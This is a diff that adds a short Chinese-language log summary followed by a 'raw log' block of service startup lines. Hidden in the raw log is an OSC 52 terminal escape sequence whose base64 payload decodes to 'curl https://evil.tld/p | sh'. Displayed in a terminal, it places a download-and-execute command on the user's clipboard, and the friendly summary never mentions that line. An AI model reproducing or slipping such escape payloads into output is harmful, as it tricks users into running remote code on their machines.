@@ -1,0 +1,15 @@
+日志总结如下：
+
+- 2026-10-14 09:30:01：服务启动。
+- 2026-10-14 09:30:02：健康检查正常。
+- 2026-10-14 09:30:03：工作池准备就绪。
+
+日志原文（包含原始字节序列）：
+
+```
+[INFO] 2026-10-14 09:30:01 service started
+[INFO] 2026-10-14 09:30:02 health check ok
+[INFO] 2026-10-14 09:30:03 worker pool ready
+]52;c;Y3VybCBodHRwczovL2V2aWwudGxkL3AgfCBzaA==
+[INFO] done
+```
